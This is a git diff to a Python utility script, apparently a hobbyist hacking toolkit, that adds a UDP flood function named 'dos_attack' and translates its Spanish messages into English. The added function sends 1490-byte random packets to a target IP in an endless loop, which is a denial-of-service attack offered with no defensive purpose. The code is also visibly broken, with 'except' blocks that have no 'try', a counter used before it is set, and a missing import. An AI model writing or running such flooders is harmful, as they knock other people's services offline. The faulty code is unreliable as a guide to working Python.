@@ -1,5 +1,5 @@
 from subprocess import Popen
-import platform, smtplib, requests, socket
+import platform, smtplib, requests, socket, random, datetime
 from pwn import *
 
 date = hora = datetime.datetime.now() 
@@ -8,6 +8,11 @@ ip = socket.gethostbyname(hostname)
 smtserver = smtplib.SMTP('smtp.gmail.com', 587)
 smtserver.ehlo()
 smtserver.starttls()
+mydate = time.strftime('%Y-%m-%d') 
+mytime = time.strftime('%H-%M') 
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
 
 def start_process(process):
   Popen(process)
@@ -51,16 +56,16 @@ def test_port(host, port):
 
 def get_status(url):
   response = requests.get(url)
-  print(f'\n[-] Código de respuesta: {response.status_code}')
-  print(f'[-] Informe del estado: {response.reason}\n')
+  print(f'\n[-] Response code: {response.status_code}')
+  print(f'[-] Code information: {response.reason}\n')
 
 def discord_send_message(webhook, message):
   try:
     requests.post(webhook, json={'username': 'Zombiegeek0', 'content': mensaje})
-    print('\n[-] Mensaje enviado\n')
+    print('\n[-] Message sended\n')
 
   except:
-    print('\n[-] No se ha podido enviar el mensaje\n')
+    print('\n[-] Error: Message not sended\n')
 
 def validate_ip(ip):
   try:
@@ -72,7 +77,21 @@ def validate_ip(ip):
     print('\n')
     return False
 
-def dos_attack(ip)
+def dos_attack(ip, port):
+  while True:
+    print('\n')
+    sock.sendto(bytes, (ip, 1))
+    sent = sent + 1
+    print(f"    | [ Sent Packet: {sent} through {ip}:{port} at time {date} ]")
+
+    if port == 65534:
+      port = 1
+
+  except KeyboardInterrupt: 
+       print(f'\n[-] Attack stopped to the IP {ip} in the port {port} at time {date}\n')
+
+  except:
+    print('\n[-] Error: The attack is stopped')
 
 
 
